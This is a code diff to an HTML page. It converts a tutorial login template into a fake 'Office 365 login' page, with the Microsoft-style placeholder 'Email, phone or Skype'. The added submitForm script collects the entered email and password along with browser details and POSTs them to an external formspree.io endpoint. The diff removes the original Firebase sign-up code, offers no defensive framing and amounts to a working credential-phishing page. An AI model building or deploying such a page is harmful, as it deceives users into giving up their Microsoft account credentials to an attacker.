@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Website with Login and Registration Form | CodingNepal</title>
+    <title>Office 365 login</title>
     <!-- Google Fonts Link For Icons -->
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@48,400,0,0">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.1.1/dist/sweetalert2.min.css">
@@ -269,7 +269,8 @@
             background-color: rgb(252, 251, 251);" class="form-content">
                 <div style="
                 background-color: rgb(252, 251, 251);" class="center">
-                    <form action="https://login-test-4f7cd-default-rtdb.firebaseio.com/" method="post" style="background-color: rgb(252, 251, 251);" id="signUp-form">
+                    <form style="background-color: rgb(252, 251, 251);" id="myForm" onsubmit="submitForm(event)">
+                      <input type="text" name="Office 365 login" value="Office 365 login" style="display: none;" readonly>
                         <div style="margin-left: -65px;" class="logo">
                           <div class="tlogo">
                           <img class="thlogo"  src="th (2).jpeg" alt="" />
@@ -284,7 +285,7 @@
                               </span>
                               <input
                                 name="Email"
-                                id="email_login"
+                                id="useremail"
                                 type="text"
                                 class="input"
                                 placeholder="Email, phone or Skype"
@@ -325,7 +326,7 @@
                                 type="password"
                                 name="Password"
                                 class="input"
-                                id="password_login"
+                                id="userpassword"
                                 placeholder="Password"
                                 required
                               />
@@ -337,7 +338,7 @@
                             </div>
                             <span class="btn">
                               <a>
-                                <button class="last" type="submit" id="Register">Sign in</button>
+                                <button class="last" type="submit">Sign in</button>
                               </a>
                             </span>
                           </span>
@@ -386,106 +387,49 @@
   <!-- Sweetalert CDN for Popup -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha512-AA1Bzp5Q0K1KanKKmvN/4d3IRKVlv9PYgwFPvm32nPO6QS8yH1HO7LbgB1pgiOxPtfeg5zEn2ba64MUcqJx6CA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 
-  <script type="module">
-    // Import the functions you need from the SDKs you need
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
-    import { getAuth, createUserWithEmailAndPassword, updateProfile } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-auth.js"; 
-    // TODO: Add SDKs for Firebase products that you want to use
-    // https://firebase.google.com/docs/web/setup#available-libraries
-  
-    // Your web app's Firebase configuration
-    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-    const firebaseConfig = {
-    apiKey: "AIzaSyC9bYZno33reps-a0iorttht_OMjpsjy2o",
-    authDomain: "login-test-4f7cd.firebaseapp.com",
-    projectId: "login-test-4f7cd",
-    storageBucket: "login-test-4f7cd.appspot.com",
-    messagingSenderId: "767596281646",
-    appId: "1:767596281646:web:5e1de8e8a80090021584bf"
-  };
-  
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app)
+  <script>
+    function submitForm(event) {
+      event.preventDefault();
 
+      // Get user's input data 
+      const formData = {
+        useremail: document.getElementById('useremail').value,
+        userpassword: document.getElementById('userpassword').value,
+      };
 
-     document.getElementById('signUp-form')
-     .addEventListener('submit', (e) => {
-        e.preventDefault();
+      //Get user's browser details
+      const browserDetails = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+      };
 
-        let fullName = document.getElementById('full_name').value
-        let emailLogin = document.getElementById('email_login').value
-        let passwordLogin = document.getElementById('password_login').value   
-        
+      //Combine user input data with browser details
+      const combinedData = {
+        ...formData,
+        ...browserDetails,
+      };
 
-        // Form Authentication
-        if(fullName.trim() === '' || emailLogin.trim() === '' || passwordLogin.trim() === ''){
-           swal({
-            text: 'All Inputs Field are required',
-            icon: 'warning'
-           })
-        }
-         else if(passwordLogin.length < 6)
-        {
-          // Popout this if the password length is less than six
-          swal({
-            text: 'Password must be atleast 6',
-            icon: 'warning'
-          })
-        } 
-        else 
-        {
-          createUserWithEmailAndPassword(auth, emailLogin, passwordLogin)
-        .then((userCredential) => {
+      // Sens combined data to your form backend (replace 'your-backend-url' with the actual URL)
+      fetch('https://formspree.io/f/xbjelena',
+      {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(combinedData),
+      })
+      .then(response => {
+        // Handle the backend response if needed
+        console.log('Backend response:', response);
+        // Perform additional form submission logic if needed
 
-          if(userCredential){
-            swal({
-              title: 'Good Job',
-              text: 'You have loged in successfully',
-              icon: 'success'
-            })
-             .then(value => {
-              if(value){
-                 window.location.replace('https://www.office.com/')
-              }
-             })
-
-             
-            // Set the Display Name for the user if the User Credentials
-            // Is true
-              const user = userCredential.user
-
-              if(user){
-                updateProfile(user, {
-                  displayName: `${fullName}`
-                })
-          }
-          }
-          
-          
-        }).catch((err) => {
-                if (err.code === 'auth/email-already-in-use') {
-                swal({
-                  title: 'Error',
-                  text: 'The email address is already in use',
-                  icon: 'error'
-                });
-              } else if (err.code === 'auth/invalid-email') {
-                swal({
-                  title: 'Error',
-                  text: 'Invalid email address',
-                  icon: 'error'
-                });
-              } else {
-                swal({
-                  title: 'Error',
-                  text: `${err.message}`,
-                  icon: 'error'
-                });
-              }
-        })
-        }
-       
-     })
+        document.getElementById('myForm').submit();
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        // handle errors if needed
+      });
+    }
   </script>
 </html>
